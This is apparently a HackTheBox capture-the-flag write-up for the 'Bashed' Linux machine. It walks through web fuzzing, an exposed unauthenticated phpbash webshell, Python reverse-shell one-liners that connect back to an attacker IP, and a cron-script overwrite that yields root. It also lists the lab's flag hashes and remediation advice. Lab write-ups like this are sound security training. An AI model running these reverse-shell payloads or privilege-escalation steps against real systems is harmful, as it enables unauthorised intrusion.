---
title: "HTB — Bashed (Easy Linux): phpbash Webshell + Cron Root"
date: 2026-05-13 10:00:00 +0000
categories: [Machines, HackTheBox]
tags: [hackthebox, linux, webshell, ffuf, cron, privesc, easy]
---

**IP:** 10.129.34.106 | **Difficulty:** Easy | **OS:** Linux (Ubuntu) | **Author:** Arrexel

## Summary

Web fuzzing machine focused on finding exposed files. The entry point is a PHP webshell (`phpbash`) left in a development directory. Privilege escalation exploits a cron job running as root that executes Python scripts from a directory where the intermediate user has write access.

| Flag | Hash |
|------|------|
| user.txt | `ab440b6b069d37839bcc6c121ec3d15a` |
| root.txt | `15a4aa589334918af374ad1582293393` |

---

## 1. Reconnaissance

```bash
nmap -sV -sC -T4 -Pn 10.129.34.106 -oA nmap/initial
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

---

## 2. Web Enumeration

```bash
ffuf -w ~/ctf/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
     -u http://10.129.34.106/FUZZ -mc 200,301,302,403
```

```
dev             [301]  ← TARGET
uploads         [301]
php             [301]
```

The `/dev` directory contains a working copy of **phpbash** — an interactive webshell with no authentication:

```bash
curl -s http://10.129.34.106/dev/phpbash.php --data "cmd=whoami"
# www-data
```

---

## 3. Foothold — Reverse Shell (www-data)

```bash
curl --data-urlencode "cmd=python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((\"10.10.15.8\",4444));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
subprocess.call([\"/bin/bash\",\"-i\"])'" \
http://10.129.34.106/dev/phpbash.php
```

```bash
cat /home/arrexel/user.txt
# ab440b6b069d37839bcc6c121ec3d15a
```

---

## 4. Privilege Escalation

### www-data → scriptmanager (sudo NOPASSWD)

```bash
sudo -l
# (scriptmanager : scriptmanager) NOPASSWD: ALL
```

### scriptmanager → root (cron job)

```bash
sudo -u scriptmanager ls -la /scripts/
# -rw-r--r-- 1 scriptmanager scriptmanager   58 Dec  4 2017 test.py
# -rw-r--r-- 1 root          root            12 May 13 14:14 test.txt  ← updated by root
```

`test.txt` gets a fresh timestamp every minute — root is running `test.py` via cron. Overwrite it:

```bash
sudo -u scriptmanager python -c "
open('/scripts/test.py','w').write(
  'import socket,subprocess,os\n'
  's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
  's.connect((\"10.10.15.8\",6666))\n'
  'os.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\n'
  'subprocess.call([\"/bin/bash\",\"-i\"])\n'
)"
```

Within a minute the cron fires `test.py` as root → root shell received.

```bash
cat /root/root.txt
# 15a4aa589334918af374ad1582293393
```

---

## Attack Chain

```
ffuf → /dev/phpbash.php (unauthenticated webshell)
  ↓ curl POST cmd= → www-data reverse shell
  ↓ sudo -u scriptmanager (NOPASSWD:ALL)
  ↓ overwrite /scripts/test.py → cron executes as root
  ↓ root shell
```

---

## Lessons Learned

| Vulnerability | Remediation |
|---------------|-------------|
| Dev webshell exposed in `/dev` with no auth | Never leave development tools in production |
| sudo NOPASSWD for service user | Restrict sudo to the minimum required |
| Root cron running scripts in user-writable dir | Script directories owned by root with mode 700 |
